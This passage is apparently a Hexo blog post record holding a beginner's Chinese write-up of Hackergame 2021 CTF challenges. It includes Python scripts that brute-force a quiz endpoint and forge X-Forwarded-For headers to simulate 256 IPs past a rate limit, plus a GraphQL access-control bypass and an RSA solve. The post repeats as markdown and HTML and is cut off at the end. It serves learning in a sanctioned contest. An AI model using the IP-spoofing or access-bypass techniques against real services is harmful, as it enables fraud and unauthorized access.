（手打真的累，还打错了一个字母）。\n\n## 去吧！追寻自由的电波\n\n> （前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。\n>\n>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。\n>\n>考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。\n>\n>为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？\n>\n>注：flag 花括号内只包含小写字母。\n\n题目说了速度变了，显然是变快了，直接用经典音频隐写软件 Audacity 打开， `Ctrl` + `A` 全选，效果-改变速率，然后随手一拖把改变百分比拖到 `70` 就有非常标准清晰的单词，不看题目都能盲猜是首字母，后来查电报区分字符串中读音相近的字母的方法也确实对应，但是我还是不想自己听，打开翻译软件，嗯，语音识别不错，除了两个花括号我一开始没反应过来把也当成字母了QAQ。\n\n## 猫咪问答 Pro Max\n\n>我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。\n\n题目的废话文学着实是让我涨了见识，这简直简直了，我以前从未想过有如此废话的废话文学，等我看见的时候已经看见了......第一问也是最难的一问，把百度必应谷歌翻烂了也没有，后来终于在一个专门存快照的国外网站上找到了那个已经消失的俱乐部的网页存档，第三问直接在中科大 Linux 用户协会官网找到，第五问也不难搜（虽然我没想到举报信可以发到这么奇怪的...呃不知怎么形容，目录？？去），第四问我看到论文直接望而生畏，搜索 data set 无果后果断爆破，合理猜测在 `100` 以下，但发现居然不行？？？万分怀疑的我试探性地把第二问改成 `3` （或许是我对近五年的理解有问题？），也不行，改成 `5` ，行了 ~~（这协会真不要 face ）~~，脚本如下：\n\n```python\nimport requests as r\nimport re\nfrom tqdm import tqdm\n\ndef main():\n    url = 'http://202.38.93.111:10001/'\n    payload = {'q1': 20150504, 'q2': 5,\n               'q3': 'Development Team of Library', 'q4': 0, 'q5': '/dev/null'}\n    headers = {'Cookie': 'session=eyJ0b2tlbiI6IjQ2Ok1FWUNJUUNyY2xUYU1XcG9sUzZqZzM0Z2IyZnMyeEJBNGtMa01DYnpKV1dERGNKWUJnSWhBT3RQTzBXSnhLMnRmcytWcVRReWd5eHdKMFY2dEZ6bGlycXVNSURHbU9EaSJ9.YXYWYA.2MXfMT2si0FkY-Z9jOc7V4jenTU'}\n    for i in tqdm(range(100)):\n        payload['q4'] = i\n        _ = r.post(url=url, data=payload, headers=headers).text\n        try:\n            rst = re.findall(\n                r'<div class=\"alert alert-secondary\" role=\"alert\">((?:.|\\n)*?)</div>', _)[0]\n        except IndexError:\n            s=re.findall(r'(flag{.*?})', _)[0]\n            print ('\\n'+s)\n            print('q4答案是'+str(i))\n            break\n\nif __name__ == '__main__':\n    main()\n```\n\n## 卖瓜\n\n> 有一个人前来买瓜。\n>\n> HQ：哥们，这瓜多少钱一斤啊？\n>\n> 你：两块钱一斤。\n>\n> HQ：What's up！这瓜皮子是金子做的还是瓜粒子是金子做的？\n>\n> 你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。\n>\n> （HQ 心里默默一算）\n>\n> HQ：给我来 20 斤的瓜。\n>\n> 你：行！\n>\n> HQ：行？这瓜能称出 20 斤吗？\n>\n> 你：我开水果摊的，还不会称重？\n>\n> HQ：我问你这瓜能称出 20 斤吗？\n>\n> 你：你是故意找茬，是不是？你要不要吧！\n>\n> HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？\n>\n> 你：要是不是 20 斤，我自己吃了它，满意了吧？\n>\n> （你开始选瓜称重）\n\n在看过上一年的题目后可以直接看出是溢出，但是输入的数字过大后出现了浮点数，于是我上网搜了数据类型，随便复制了一个数（ 2 的多少次方来着？？忘了）过来输入到 9 斤那，出现了一个大负数，然后我掏出大宝贝—— Windows 计算器除以 6 ，结果去掉小数后再输入到 6 斤那，此时称上有了 -2 斤，嗯，可行，再来一次， -4 了，直接再放 4 个 6 斤，逃过一劫，得到 flag 。\n\n## FLAG 助力大红包\n\n> “听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”\n>\n> “还有这么好的事情？我也要参加！”\n>\n> “快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”\n>\n> “那怎么才能参加呢？”\n>\n> “这还不简单！点击下面的链接就行”\n\n这应该是让我学到最多东西的一题，看到题目的说明我第一反应就是通过 http 请求头伪造 IP 地址，搜到可以通过 X-Forwarded-For 实现，但中途我试图通过审查元素修改表单数据实现，结果提示前后端地址不匹配（后来才发现我没读题），于是找了个伪造 IP 地址的插件，这次是后端改了前端还是原来的，两个结合，发现可以成功砍到，手改几次后发现速度来不及，被迫找到 Python 的实现，一开始没加时间限制发现有令牌桶防着，就加了个停顿，脚本如下：\n\n```python\nimport requests\nimport time\nfrom tqdm import tqdm\nurl = 'http://202.38.93.111:10888/invite/77632ca2-c165-46ee-a8d2-ba89094b0401'\nua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'\nfor i in tqdm(range(256)):\n    s = (str(i)+'.104.67.89')\n    params = {\"ip\": s,}\n    request = requests.post(url, data=params, headers={'User-agent': ua, 'X-Forwarded-For':s})\n    time.sleep(0.9)\nprint(request.text)\n```\n\n## Amnesia第一问\n\n> 你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。\n>\n> 编译指令：gcc -O file.c -m32\n>\n> 运行指令：./a.out\n>\n> 编译器版本：Docker 镜像 ustclug/debian:10 中 apt update && apt -y upgrade && apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本\n>\n> 轻度失忆\n>\n> 编译后 ELF 文件的 .data 和 .rodata 段会被清零。\n>\n> 连接题目：nc 202.38.93.111 10051 或网页终端\n>\n> 判题脚本：下载\n\n第一问不难，发现直接 `printf(\"Hello,world!\")` 失败后改成用 `printf(\"%c\",<每个字符的ASCII码>)`，但提交后错误，仔细检查发现多了几个奇怪的不可显示字符，应该是直接从网页复制的问题，删掉后提交得到flag，比赛结束后才知道还可以 putchar 呃呃\n\n## 图之上的信息\n\n> 小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。\n>\n> 你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？\n\n第一反应是 SQL 注入，但零基础的我忙活了半天才知道 `/graphql` 是端点，查看 http 请求看到负载语句 `{query: \"{ notes(userId: 2) { id↵contents }}\"}` 猜测 admin 的 id 是 1 ，于是疯狂查询 1 的 contents ，结果回显都是我没有权限，后来搜到了 Graphql 的 IDE ，找到了存储邮箱的地方，查询得到 flag 。\n\n## Easy RSA\n\n> 自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。\n>\n> 更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。\n\n```python\nimport math\nimport sympy\nfrom Crypto.Util.number import *\n\ne = 65537\n\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    value_p = sympy.nextprime((math.factorial(y)) % x)  # Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征\n    return value_p\n\n\ndef get_q():\n    value = [getPrime(256)]\n    for i in range(1, 10):\n        value.append(sympy.nextprime(value[i - 1]))\n    print(\"value[-1] = \", value[-1])\n    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967\n    n = 1\n    for i in range(10):\n        n = n * value[i]\n    q = getPrime(512)\n    value_q = pow(q, e, n)\n    print(\"value_q = \", value_q)\n    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    return sympy.nextprime(q)\n\n# this destroyes the rsa cryptosystem\np = get_p()\nq = get_q()\n\nm = int.from_bytes(open(\"flag.txt\", \"rb\").read(), \"big\")\nc = pow(m, e, p * q)\nprint(\"c = \", c)\n# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n```\n\n数理杀我的一题， acm 的题中有过类似的，威尔逊定理求出 $p$ ， $q$ 的话不难求，很好，现在是经典 RSA 了，什么，你问我到底怎么求的 p？~~哦？我还等你讲给我听呢（装傻，阿巴阿巴）。~~\n首先科普一下模逆元的概念，比如 $x\\equiv 3^{-1}\\mod 5$ ，这个并非是 $x=\\frac{1}{3}$ 的意思，而是 $x$ 满足 $3x\\equiv 1 \\mod 5$ ，这时口算得出 $x=2$ ，因为 $6\\equiv 1 \\mod5$ 嘛。\n然后是威尔逊定理，即 $(p-1)!\\equiv-1 \\pmod p$ 是 $p$ 为素数的充要条件。\n题目给出大数 $x$ 和比 $x$ 小一点的 $y$ ，要我们求 $y! \\mod x$ ，检验发现 $x$ 是一个素数，那么就有 $(x-1)!\\equiv-1 \\pmod x$ 。\n继而由 $(x-1)!=y(y+1)(y+2)\\cdots(x-1)$ ，不难推知\n$$\ny!\\equiv -1(x-1)^{-1}(x-2)^{-1}\\cdots (y+1)^{-1} \\mod\\ x\n$$\npython 计算逆元有两种方法，一种是 `pow(a, -1, b)`，另一种是用 gmpy2 库，即 `gmpy2.invert(a,b)`\n\n完整 exp 如下：\n\n```python\nimport sympy\nfrom Crypto.Util.number import *\nfrom gmpy2 import invert\n\ne = 65537\n\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    facymodx = -1\n    for i in range(y+1,x):\n        facymodx = facymodx*invert(i,x)%x\n    value_p = sympy.nextprime(facymodx)\n    return value_p\n\n\ndef get_q():\n    value_inverse = [\n        80096058210213458444437404275177554701604739094679033012396452382975889905967]\n    for i in range(1, 10):\n        value_inverse.append(sympy.prevprime(value_inverse[i-1]))\n\n    n = 1\n    phi = 1\n\n    for i in range(10):\n        n = n * value_inverse[i]\n        phi = phi * (value_inverse[i]-1)\n\n    value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    d = invert(e, phi)\n    q = pow(value_q, d, n)\n    return sympy.nextprime(q)\n\n\nc = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n\nif __name__ == '__main__':\n    p = get_p()\n    q = get_q()\n    # print(len(str(q)))\n    print(p)\n    print(q)\n    n = p * q\n    phi = (p-1) * (q-1)\n\n    d = invert(e, phi)\n\n    m = pow(c, d, n)\n\n    print(long_to_bytes(m))\n```\n","source":"_posts/Hackergame2021-writeups.md","raw":"---\ntitle: Hackergame 2021 writeups\ndate: 2021-11-05 12:00:00\ntags: CTF\ncategories: 题解\n---\n\n第一次打CTF比赛\n<!--more-->\n## Summary\n\n作为新手，第一次参加 CTF ，题目比 MSClub 的招新 puzzle 难得多，但是也好玩得多，前两天有幸短暂地在总榜停留过（或者只是第一天？忘了），最终组内排名第四（因为校内的大佬不在）（ GZTime tql ，凌晨肝神冲到总榜第四orz，此处附上 [wp 传送门](https://blog.gztime.cc/posts/2021/9f04efbd/)）。比赛的题目出得都非常得有趣 ~~（除了透明的文件）~~，对新手来说体验确实不错，也确实是名副其实的 pythongame（零基础强行入门），做到灯那题的时候我面对线性非齐次方程组的无穷多解毫无头绪，这彻底燃起了我学线代的激情（嗯，有意思），最后我交的第一个错误的 flag 上了花絮也有小小的惊喜（没错我确实是有备而来 hiahiahia）。总体体验良好，明年再来。下面是我做出的几题的 wp，内容较水，可酌情移步至[神（mcfx）的 wp](https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/)。\n\n********************************\n\n## 签到\n\n> 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！\n\n很简单的 web 题，注意到网址栏的后面的`?page=<当面的数字>`，直接修改，疯狂加 0，然后二分法试探，最终在 `?page=1635000000` 的时候到达当前时间，出 flag (后来才知道这是时间戳)。\n\n## 进制十六——参上\n\n> 为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。\n>\n>而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。\n>\n>好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。\n>\n>只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……\n\n![Hex](https://hack.lug.ustc.edu.cn/media/629da242-b1b1-5f69-a623-1c13fcedf019/hex_editor.png)\n\n同样是很简单的题目，随便找个十六进制编辑器照着抄下然后得出右边的 flag （手打真的累，还打错了一个字母）。\n\n## 去吧！追寻自由的电波\n\n> （前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。\n>\n>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。\n>\n>考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。\n>\n>为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？\n>\n>注：flag 花括号内只包含小写字母。\n\n题目说了速度变了，显然是变快了，直接用经典音频隐写软件 Audacity 打开， `Ctrl` + `A` 全选，效果-改变速率，然后随手一拖把改变百分比拖到 `70` 就有非常标准清晰的单词，不看题目都能盲猜是首字母，后来查电报区分字符串中读音相近的字母的方法也确实对应，但是我还是不想自己听，打开翻译软件，嗯，语音识别不错，除了两个花括号我一开始没反应过来把也当成字母了QAQ。\n\n## 猫咪问答 Pro Max\n\n>我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。\n\n题目的废话文学着实是让我涨了见识，这简直简直了，我以前从未想过有如此废话的废话文学，等我看见的时候已经看见了......第一问也是最难的一问，把百度必应谷歌翻烂了也没有，后来终于在一个专门存快照的国外网站上找到了那个已经消失的俱乐部的网页存档，第三问直接在中科大 Linux 用户协会官网找到，第五问也不难搜（虽然我没想到举报信可以发到这么奇怪的...呃不知怎么形容，目录？？去），第四问我看到论文直接望而生畏，搜索 data set 无果后果断爆破，合理猜测在 `100` 以下，但发现居然不行？？？万分怀疑的我试探性地把第二问改成 `3` （或许是我对近五年的理解有问题？），也不行，改成 `5` ，行了 ~~（这协会真不要 face ）~~，脚本如下：\n\n```python\nimport requests as r\nimport re\nfrom tqdm import tqdm\n\ndef main():\n    url = 'http://202.38.93.111:10001/'\n    payload = {'q1': 20150504, 'q2': 5,\n               'q3': 'Development Team of Library', 'q4': 0, 'q5': '/dev/null'}\n    headers = {'Cookie': 'session=eyJ0b2tlbiI6IjQ2Ok1FWUNJUUNyY2xUYU1XcG9sUzZqZzM0Z2IyZnMyeEJBNGtMa01DYnpKV1dERGNKWUJnSWhBT3RQTzBXSnhLMnRmcytWcVRReWd5eHdKMFY2dEZ6bGlycXVNSURHbU9EaSJ9.YXYWYA.2MXfMT2si0FkY-Z9jOc7V4jenTU'}\n    for i in tqdm(range(100)):\n        payload['q4'] = i\n        _ = r.post(url=url, data=payload, headers=headers).text\n        try:\n            rst = re.findall(\n                r'<div class=\"alert alert-secondary\" role=\"alert\">((?:.|\\n)*?)</div>', _)[0]\n        except IndexError:\n            s=re.findall(r'(flag{.*?})', _)[0]\n            print ('\\n'+s)\n            print('q4答案是'+str(i))\n            break\n\nif __name__ == '__main__':\n    main()\n```\n\n## 卖瓜\n\n> 有一个人前来买瓜。\n>\n> HQ：哥们，这瓜多少钱一斤啊？\n>\n> 你：两块钱一斤。\n>\n> HQ：What's up！这瓜皮子是金子做的还是瓜粒子是金子做的？\n>\n> 你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。\n>\n> （HQ 心里默默一算）\n>\n> HQ：给我来 20 斤的瓜。\n>\n> 你：行！\n>\n> HQ：行？这瓜能称出 20 斤吗？\n>\n> 你：我开水果摊的，还不会称重？\n>\n> HQ：我问你这瓜能称出 20 斤吗？\n>\n> 你：你是故意找茬，是不是？你要不要吧！\n>\n> HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？\n>\n> 你：要是不是 20 斤，我自己吃了它，满意了吧？\n>\n> （你开始选瓜称重）\n\n在看过上一年的题目后可以直接看出是溢出，但是输入的数字过大后出现了浮点数，于是我上网搜了数据类型，随便复制了一个数（ 2 的多少次方来着？？忘了）过来输入到 9 斤那，出现了一个大负数，然后我掏出大宝贝—— Windows 计算器除以 6 ，结果去掉小数后再输入到 6 斤那，此时称上有了 -2 斤，嗯，可行，再来一次， -4 了，直接再放 4 个 6 斤，逃过一劫，得到 flag 。\n\n## FLAG 助力大红包\n\n> “听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”\n>\n> “还有这么好的事情？我也要参加！”\n>\n> “快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”\n>\n> “那怎么才能参加呢？”\n>\n> “这还不简单！点击下面的链接就行”\n\n这应该是让我学到最多东西的一题，看到题目的说明我第一反应就是通过 http 请求头伪造 IP 地址，搜到可以通过 X-Forwarded-For 实现，但中途我试图通过审查元素修改表单数据实现，结果提示前后端地址不匹配（后来才发现我没读题），于是找了个伪造 IP 地址的插件，这次是后端改了前端还是原来的，两个结合，发现可以成功砍到，手改几次后发现速度来不及，被迫找到 Python 的实现，一开始没加时间限制发现有令牌桶防着，就加了个停顿，脚本如下：\n\n```python\nimport requests\nimport time\nfrom tqdm import tqdm\nurl = 'http://202.38.93.111:10888/invite/77632ca2-c165-46ee-a8d2-ba89094b0401'\nua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'\nfor i in tqdm(range(256)):\n    s = (str(i)+'.104.67.89')\n    params = {\"ip\": s,}\n    request = requests.post(url, data=params, headers={'User-agent': ua, 'X-Forwarded-For':s})\n    time.sleep(0.9)\nprint(request.text)\n```\n\n## Amnesia第一问\n\n> 你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。\n>\n> 编译指令：gcc -O file.c -m32\n>\n> 运行指令：./a.out\n>\n> 编译器版本：Docker 镜像 ustclug/debian:10 中 apt update && apt -y upgrade && apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本\n>\n> 轻度失忆\n>\n> 编译后 ELF 文件的 .data 和 .rodata 段会被清零。\n>\n> 连接题目：nc 202.38.93.111 10051 或网页终端\n>\n> 判题脚本：下载\n\n第一问不难，发现直接 `printf(\"Hello,world!\")` 失败后改成用 `printf(\"%c\",<每个字符的ASCII码>)`，但提交后错误，仔细检查发现多了几个奇怪的不可显示字符，应该是直接从网页复制的问题，删掉后提交得到flag，比赛结束后才知道还可以 putchar 呃呃\n\n## 图之上的信息\n\n> 小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。\n>\n> 你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？\n\n第一反应是 SQL 注入，但零基础的我忙活了半天才知道 `/graphql` 是端点，查看 http 请求看到负载语句 `{query: \"{ notes(userId: 2) { id↵contents }}\"}` 猜测 admin 的 id 是 1 ，于是疯狂查询 1 的 contents ，结果回显都是我没有权限，后来搜到了 Graphql 的 IDE ，找到了存储邮箱的地方，查询得到 flag 。\n\n## Easy RSA\n\n> 自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。\n>\n> 更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。\n\n```python\nimport math\nimport sympy\nfrom Crypto.Util.number import *\n\ne = 65537\n\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    value_p = sympy.nextprime((math.factorial(y)) % x)  # Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征\n    return value_p\n\n\ndef get_q():\n    value = [getPrime(256)]\n    for i in range(1, 10):\n        value.append(sympy.nextprime(value[i - 1]))\n    print(\"value[-1] = \", value[-1])\n    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967\n    n = 1\n    for i in range(10):\n        n = n * value[i]\n    q = getPrime(512)\n    value_q = pow(q, e, n)\n    print(\"value_q = \", value_q)\n    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    return sympy.nextprime(q)\n\n# this destroyes the rsa cryptosystem\np = get_p()\nq = get_q()\n\nm = int.from_bytes(open(\"flag.txt\", \"rb\").read(), \"big\")\nc = pow(m, e, p * q)\nprint(\"c = \", c)\n# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n```\n\n数理杀我的一题， acm 的题中有过类似的，威尔逊定理求出 $p$ ， $q$ 的话不难求，很好，现在是经典 RSA 了，什么，你问我到底怎么求的 p？~~哦？我还等你讲给我听呢（装傻，阿巴阿巴）。~~\n首先科普一下模逆元的概念，比如 $x\\equiv 3^{-1}\\mod 5$ ，这个并非是 $x=\\frac{1}{3}$ 的意思，而是 $x$ 满足 $3x\\equiv 1 \\mod 5$ ，这时口算得出 $x=2$ ，因为 $6\\equiv 1 \\mod5$ 嘛。\n然后是威尔逊定理，即 $(p-1)!\\equiv-1 \\pmod p$ 是 $p$ 为素数的充要条件。\n题目给出大数 $x$ 和比 $x$ 小一点的 $y$ ，要我们求 $y! \\mod x$ ，检验发现 $x$ 是一个素数，那么就有 $(x-1)!\\equiv-1 \\pmod x$ 。\n继而由 $(x-1)!=y(y+1)(y+2)\\cdots(x-1)$ ，不难推知\n$$\ny!\\equiv -1(x-1)^{-1}(x-2)^{-1}\\cdots (y+1)^{-1} \\mod\\ x\n$$\npython 计算逆元有两种方法，一种是 `pow(a, -1, b)`，另一种是用 gmpy2 库，即 `gmpy2.invert(a,b)`\n\n完整 exp 如下：\n\n```python\nimport sympy\nfrom Crypto.Util.number import *\nfrom gmpy2 import invert\n\ne = 65537\n\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    facymodx = -1\n    for i in range(y+1,x):\n        facymodx = facymodx*invert(i,x)%x\n    value_p = sympy.nextprime(facymodx)\n    return value_p\n\n\ndef get_q():\n    value_inverse = [\n        80096058210213458444437404275177554701604739094679033012396452382975889905967]\n    for i in range(1, 10):\n        value_inverse.append(sympy.prevprime(value_inverse[i-1]))\n\n    n = 1\n    phi = 1\n\n    for i in range(10):\n        n = n * value_inverse[i]\n        phi = phi * (value_inverse[i]-1)\n\n    value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    d = invert(e, phi)\n    q = pow(value_q, d, n)\n    return sympy.nextprime(q)\n\n\nc = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n\nif __name__ == '__main__':\n    p = get_p()\n    q = get_q()\n    # print(len(str(q)))\n    print(p)\n    print(q)\n    n = p * q\n    phi = (p-1) * (q-1)\n\n    d = invert(e, phi)\n\n    m = pow(c, d, n)\n\n    print(long_to_bytes(m))\n```\n","slug":"Hackergame2021-writeups","published":1,"updated":"2024-06-03T06:40:10.107Z","_id":"cl8wgppov0009ck6gd75s734j","comments":1,"layout":"post","photos":[],"content":"<p>第一次打CTF比赛</p>\n<span id=\"more\"></span>\n<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>作为新手，第一次参加 CTF ，题目比 MSClub 的招新 puzzle 难得多，但是也好玩得多，前两天有幸短暂地在总榜停留过（或者只是第一天？忘了），最终组内排名第四（因为校内的大佬不在）（ GZTime tql ，凌晨肝神冲到总榜第四orz，此处附上 <a href=\"https://blog.gztime.cc/posts/2021/9f04efbd/\">wp 传送门</a>）。比赛的题目出得都非常得有趣 <del>（除了透明的文件）</del>，对新手来说体验确实不错，也确实是名副其实的 pythongame（零基础强行入门），做到灯那题的时候我面对线性非齐次方程组的无穷多解毫无头绪，这彻底燃起了我学线代的激情（嗯，有意思），最后我交的第一个错误的 flag 上了花絮也有小小的惊喜（没错我确实是有备而来 hiahiahia）。总体体验良好，明年再来。下面是我做出的几题的 wp，内容较水，可酌情移步至<a href=\"https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/\">神（mcfx）的 wp</a>。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><blockquote>\n<p>为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！</p>\n</blockquote>\n<p>很简单的 web 题，注意到网址栏的后面的<code>?page=&lt;当面的数字&gt;</code>，直接修改，疯狂加 0，然后二分法试探，最终在 <code>?page=1635000000</code> 的时候到达当前时间，出 flag (后来才知道这是时间戳)。</p>\n<h2 id=\"进制十六——参上\"><a 